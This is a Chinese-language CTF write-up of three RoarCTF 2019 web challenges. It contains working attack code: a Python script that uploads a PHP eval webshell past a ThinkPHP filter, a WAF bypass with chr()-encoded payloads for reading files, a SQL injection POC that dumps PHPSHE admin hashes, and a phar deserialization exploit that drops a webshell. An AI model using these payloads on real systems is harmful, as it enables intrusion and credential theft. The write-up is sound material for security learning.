# [RoarCTF 2019]

## 0x01 Simple Upload

首页给了源码

```php
<?php
namespace Home\Controller;

use Think\Controller;

class IndexController extends Controller
{
    public function index()
    {
        show_source(__FILE__);
    }
    public function upload()
    {
        $uploadFile = $_FILES['file'] ;
        
        if (strstr(strtolower($uploadFile['name']), ".php") ) {
            return false;
        }
        
        $upload = new \Think\Upload();// 实例化上传类
        $upload->maxSize  = 4096 ;// 设置附件上传大小
        $upload->allowExts  = array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型
        $upload->rootPath = './Public/Uploads/';// 设置附件上传目录
        $upload->savePath = '';// 设置附件上传子目录
        $info = $upload->upload() ;
        if(!$info) {// 上传错误提示错误信息
          $this->error($upload->getError());
          return;
        }else{// 上传成功 获取上传文件信息
          $url = __ROOT__.substr($upload->rootPath,1).$info['file']['savepath'].$info['file']['savename'] ;
          echo json_encode(array("url"=>$url,"success"=>1));
        }
    }
}
```

根据Thinkphp的URL构造

``/index.php/home/index/upload``可以上传文件

``$upload->upload() ;``无参数可以上传任意个数文件而``allowExts``只能限制第一个的后缀名

然后再利用Upload ``'saveName'     => array('uniqid', ''),``基于时间命名的特性进行爆破shell文件名,getshell,（这里是直接把shell变成flag了....）

```php
import requests
import base64

url = "http://70e50a65-e216-4fd2-aa95-a79ba62daaa7.node3.buuoj.cn/index.php/home/index/upload"

files = {
            "file":("a.txt",'a'),
            "file1":("b.php", '<?php echo "233";eval($_REQUEST["eki"]);'),
        }

data = {"upload":"Submit"}

r = requests.post(url=url, data=data, files=files)
print(r.text) 
```

## 0x02 Easy Calc

点进去是一个简单的计算器

输入1+1返回2

输入{{1+1}}提示无法计算

看下源代码

```js
    $('#calc').submit(function(){
        $.ajax({
            url:"calc.php?num="+encodeURIComponent($("#content").val()),
            type:'GET',
            success:function(data){
                $("#result").html(`<div class="alert alert-success">
            <strong>答案:</strong>${data}
            </div>`);
            },
            error:function(){
                alert("这啥?算不来!");
            }
        })
        return false;
    })
```

调用了calc.php,访问看一下

```php
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?>
```

使用了eval()意味着我们只要能绕过blacklist就能执行任意命令。

测试了一下只能输入运算符和数字，怎么办....

查阅资料发现只要在num前加个空格就可以绕过waf对num的数字检测了

```
poc=/calc.php?%20num=phpinfo()
```

Exp:

```
payload=/calc.php?%20num=var_dump(scandir(chr(47))) //"/" ""被ban,用chr绕过

1array(24) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(10) ".dockerenv" [3]=> string(3) "bin" [4]=> string(4) "boot" [5]=> string(3) "dev" [6]=> string(3) "etc" [7]=> string(5) "f1agg" [8]=> string(4) "home" [9]=> string(3) "lib" [10]=> string(5) "lib64" [11]=> string(5) "media" [12]=> string(3) "mnt" [13]=> string(3) "opt" [14]=> string(4) "proc" [15]=> string(4) "root" [16]=> string(3) "run" [17]=> string(4) "sbin" [18]=> string(3) "srv" [19]=> string(8) "start.sh" [20]=> string(3) "sys" [21]=> string(3) "tmp" [22]=> string(3) "usr" [23]=> string(3) "var" }

payload=var_dump(readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))

flag{ec5c334b-a625-4a44-bede-7fb5dd20ef87} int(43)
```

## PHPSHE

看是个电商系统 找CVE

https://anquan.baidu.com/article/697

复现SQL注入

注入点
```
include/plugin/payment/alipay/pay.php?id=
```

POC:
```
pay` where 1=1 union select 1,2,user(),4,5,6,7,8,9,10,11,12%23_
```

形成注入

```sql
select * from `pe_order_pay` where 1=1 union select 1,2,user(),4,5,6,7,8,9,10,11,12 #`_ where
```

对``_``使用有限制，无法使用information_schema

使用无列名注入

```
(select`3`from(select 1,2,3,4,5,6 union select * from admin)a limit 1,1)
```

得到

```
admin 
2476bf5c8d3653e843b6ed42c0672b91 : altman777
```

登录后台有上传点

审计源码 ，特别是和原版diff发现

```
phpstorm64 diff C:\Users\Eki\Desktop\phpshe1.7 C:\Users\Eki\Desktop\source
```

有PCLZIP类，且存在反序列化利用方法

```php
  public function __destruct()

  {
      $this->extract(PCLZIP_OPT_PATH, $this->save_path);
  }
```

可以解压zip到可控目录，那么我们可以上传一个webshell zip

去找有无反序列化利用点

一个是序列化，一个是对文件的操作

猜测模板功能会涉及到相关操作

```
/admin.php?mod=moban&act=del
```

```php
	case 'del':
		pe_token_match();
		$tpl_name = pe_dbhold($_g_tpl);
		if ($tpl_name == 'default') pe_error('默认模板不能删除...');
		if ($db->pe_num('setting', array('setting_key'=>'web_tpl', 'setting_value'=>$tpl_name))) {
			pe_error('使用中不能删除');
		}
		else {
			pe_dirdel("{$tpl_name}");
			pe_success('删除成功!');
		}
    break;
//调用了
//删除文件夹
function pe_dirdel($dir_path)
{
	$dir_path = str_replace("..", " ", $dir_path);
	if (is_file($dir_path)) {
		#unlink($dir_path);
	}
	else {
		$dir_arr = glob(trim($dir_path).'/*');
		if (is_array($dir_arr)) {
			foreach ($dir_arr as $k => $v) {
				pe_dirdel($v, $type);
			}	
		}
		#rmdir($dir_path);
	}
}
```

``is_file``会触发phar反序列化，那么解法很明显了

上传zip

生成exp

```php
<?php
    class PclZip
    {
        // ----- Filename of the zip file
        var $zipname = '';

        // ----- File descriptor of the zip file
        var $zip_fd = 0;

        // ----- Internal error handling
        var $error_code = 1;
        var $error_string = '';

        // ----- Current status of the magic_quotes_runtime
        // This value store the php configuration for magic_quotes
        // The class can then disable the magic_quotes and reset it after
        var $magic_quotes_status;
        var $save_path;

        // --------------------------------------------------------------------------------
        // Function : PclZip()
        // Description :
        //   Creates a PclZip object and set the name of the associated Zip archive
        //   filename.
        //   Note that no real action is taken, if the archive does not exist it is not
        //   created. Use create() for that.
        // --------------------------------------------------------------------------------
        function __construct($p_zipname)
        {
            //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, 'PclZip::PclZip', "zipname=$p_zipname");

            // ----- Tests the zlib
            

            // ----- Set the attributes
            $this->zipname = $p_zipname;
            $this->zip_fd = 0;
            $this->magic_quotes_status = -1;

            // ----- Return
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 1);
            return;
        }
    }

    $o=new PclZip("/var/www/html/data/attachment/2020-10/2020101509270216077w.zip");
    $o->save_path='/var/www/html/data';
    @unlink("test.phar");
    $phar = new Phar("test.phar"); //后缀名必须为phar，生成之后可以修改
    $phar->startBuffering();
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>
```

解压上传zip GetShell

这里需要注意要传入参数token和Referer，来通过CSRF的校验

### 参考资料

https://www.freebuf.com/articles/web/213359.html

https://nikoeurus.github.io/2019/10/14/RoarCTF